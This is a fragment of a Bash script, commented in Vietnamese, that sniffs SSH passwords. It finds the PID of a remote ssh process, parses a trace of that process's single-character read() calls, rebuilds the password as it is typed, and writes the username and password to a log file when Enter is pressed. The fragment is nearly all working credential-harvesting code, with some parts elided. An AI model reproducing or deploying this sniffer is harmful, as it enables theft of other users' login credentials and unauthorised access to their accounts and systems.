...
# grep -w ssh để lọc các tiến trình có tên chính xác ssh
# grep @ để lọc các tiến trình ssh từ xa
# head -n1 để lấy dòng đầu tiên
# awk '{print $2}' để lấy PID của tiến trình ssh
    ...
    if [[ $pid != "" ]]; then
        ...
        cat $file_log2 | while read line; do 
            if [[ $line =~ "read(4, ".*", 1)" ]]; then # Dựa vào định dạng ta thấy trong file_log2 ta sẽ lọc ra từng kí tự 1 khi người dùng nhập mật khẩu
                c=`echo $line | awk '{print $3}' | cut -d'"' -f2` # lấy ra cột 3 và lấy kí tự ở trong dấu ngoặc kép
                if [[ $c == $'\n' ]];then # khi gặp n là người dùng ấn enter, tiến hành ghi vào file_log
                    echo "Username: " $username >> $file_log
                    echo "Password: " $password >> $file_log
                    password=""
                else # nếu chưa gặp kí tự enter thì sẽ tiếp tục cộng kí tự vừa nhập vào cuối chuỗi mật khẩu
                    password+=$c
                fi
            fi
        done
